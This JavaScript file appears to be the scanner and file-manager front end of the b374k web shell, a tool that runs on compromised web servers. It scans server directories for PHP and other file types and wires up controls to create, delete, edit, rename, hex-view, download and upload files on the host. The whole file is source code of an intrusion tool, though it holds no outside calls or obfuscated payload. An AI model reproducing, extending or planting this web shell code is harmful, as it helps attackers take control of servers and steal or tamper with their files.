Zepto(function ($) {
	scanner_init();
});

var scannerTypeSupported = "";

function scanner_init() {
	if ((scannerTypeSupported = localStorage.getItem('scanner_type_supported'))) {
		output("scanner : " + scannerTypeSupported);
		scanner_add_type_supported();
	} else {
		send_post({
			scannerGetTypeSupported: ""
		}, function (res) {
			if (res != "error") {
				localStorage.setItem('scanner_type_supported', res);
				scannerTypeSupported = res;
				output("scanner : " + scannerTypeSupported);
				scanner_add_type_supported();
			}
		});
	}
}

function scanner_add_type_supported() {
	splits = scannerTypeSupported.split("{[|b374k|]}");
	$.each(splits, function (i, k) {
		$('.scannerInfoRow #type').append("<option>" + k + "</option>");
	});
}

function scanner_go(path, type, showfiles) {
	if (path == null) {
		path = $('#path').val();
	};
	if (path == null || path == '') {
		path = get_cwd();
	};
	$('#path').val(path);

	if (type == null) {
		type = $('#type').val();
	};
	if (type == null || type == '') {
		type = 'php';
	};

	if (showfiles == null) {
		showfiles = 'true';
	}
	$('#xplTable').remove();
	send_post({
		scannerPath: path,
		scannerType: type,
		showfiles: showfiles
	}, function (res) {
		if (res.indexOf('error') != 0) {
			$('#scannerResult').html(res);
			scanner_bind();
			window_resize();
		}
	});
}

function scanner_bind() {
	$('.newfolder').off('click');
	$('.newfolder').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		newfolder(path);
	});

	$('.newfile').off('click');
	$('.newfile').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		newfile(path);
	});

	$('.del').off('click');
	$('.del').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		del(path);
	});

	$('.view').off('click');
	$('.view').on('click', function (e) {
		path = xpl_href($(this));
		view(path, 'auto');
		hide_box();
	});

	$('.hex').off('click');
	$('.hex').on('click', function (e) {
		path = xpl_href($(this));
		view(path, 'hex');
	});

	$('#viewFullsize').off('click');
	$('#viewFullsize').on('click', function (e) {
		src = $('#viewImage').attr('src');
		window.open(src);
	});

	$('.edit').off('click');
	$('.edit').on('click', function (e) {
		path = xpl_href($(this));
		view(path, 'edit');
		hide_box();
	});

	$('.ren').off('click');
	$('.ren').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		ren(path);
	});

	$('.action').off('click');
	$('.action').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		action(path, 'file');
	});

	$('.actionfolder').off('click');
	$('.actionfolder').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		action(path, 'dir');
	});

	$('.actiondot').off('click');
	$('.actiondot').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		action(path, 'dot');
	});

	$('.dl').off('click');
	$('.dl').on('click', function (e) {
		path = html_safe(xpl_href($(this)));
		$('#form').append("<input type='hidden' name='download' value='" + path + "'>");
		$('#form').submit();
		$('#form').html('');
		hide_box();
	});

	$('.ul').off('click');
	$('.ul').on('click', function (e) {
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		ul(path);
		hide_box();
	});

	$('.find').off('click');
	$('.find').on('click', function (e) {
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		find(path);
		hide_box();
	});

	$('#massAction').off('click');
	$('#massAction').on('change', function (e) {
		scanType = $('#massAction').val();
		mass_act(scanType);
		$('#massAction').val('Action');
	});

	cbox_bind('scannerResult');
}